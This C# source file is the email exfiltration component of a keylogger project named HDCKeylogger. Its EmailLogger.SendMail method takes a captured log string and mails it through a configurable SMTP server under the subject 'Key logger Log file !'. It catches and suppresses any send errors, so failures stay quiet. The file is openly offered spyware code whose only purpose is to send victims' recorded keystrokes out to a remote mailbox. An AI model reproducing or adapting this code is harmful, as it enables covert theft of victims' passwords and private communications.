using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace HDCKeylogger.Logging
{
    public class EmailLogger
    {
        public static void SendMail(string mailaddress, string smtpHost, int smtpPort, string mailpassword, string logstr, bool sslstate)
        {
            try
            {
                var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                var toAddress = new MailAddress(mailaddress, "CSKeylogger");
                const string subject = "Key logger Log file !";
                var smtp = new SmtpClient
                {
                    Host = smtpHost,
                    Port = smtpPort,
                    EnableSsl = sslstate,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = logstr,
                })
                {
                    smtp.Send(message);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }
    }
}
